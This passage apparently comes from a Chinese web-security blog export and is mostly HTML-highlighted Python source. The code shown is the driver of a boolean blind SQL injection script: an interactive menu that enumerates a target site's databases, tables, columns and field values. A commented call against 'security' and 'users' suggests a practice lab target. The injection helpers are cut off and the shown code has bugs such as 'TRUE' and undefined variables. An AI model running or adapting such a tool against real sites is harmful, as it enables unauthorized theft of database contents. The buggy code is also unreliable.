start\",start,stop,mid)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>                start <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>                stop <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token keyword\">return</span> DtName</pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">menuShow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token operator\">*</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'欢迎使用布尔盲注脚本请记得修改上方url与回显值key'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.根据上方url得到所有数据库名'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2.根据数据库名得到所有表名'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'3.根据表名得到所有字段名'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'4.根据字段名得到所有值'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'5.退出'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token operator\">*</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">runMain</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token comment\"># 主控模板，对应于下一级菜单其下各功能选择执行</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>        <span class=\"token keyword\">if</span> choice <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>            name<span class=\"token operator\">=</span>dbname<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token string\">'2'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>            a<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入数据库名称：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>            TbName<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token string\">'3'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>            a<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入数据库名称：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>            b<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入表名：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>            coName<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token string\">'4'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>            a<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入数据库名称：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>            b<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入表名：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>            c<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入字段名：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>            DataName<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>        <span class=\"token keyword\">elif</span> choice <span class=\"token operator\">==</span> <span class=\"token string\">'5'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    <span class=\"token keyword\">while</span> TRUE<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>        menuShow<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>        choice<span class=\"token operator\">=</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入您的选择（0-5）：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>        runMain<span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token comment\"># coName(url,\"security\",\"users\")</span></pre></td></tr></table></figure>",
            "tags": [
                "web安全"
            ]
        }
    ]
}